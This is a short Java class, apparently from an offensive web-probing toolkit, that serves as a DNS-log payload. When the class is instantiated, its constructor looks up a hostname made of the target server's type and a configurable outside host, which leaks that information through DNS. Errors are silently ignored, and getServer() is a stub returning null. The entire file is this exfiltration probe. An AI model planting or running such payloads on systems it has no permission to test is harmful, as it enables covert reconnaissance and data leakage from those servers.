package com.reajason.javaweb.probe.payload.dns;

import java.net.InetAddress;

/**
 * @author ReaJason
 * @since 2025/7/28
 */
public class DnsLogServer {
    public static String host;

    public DnsLogServer() {
        try {
            InetAddress.getAllByName("serverType." + getServer().toLowerCase() + "." + host);
        } catch (Throwable ignored) {
        }
    }

    private String getServer() {
        return null;
    }
}
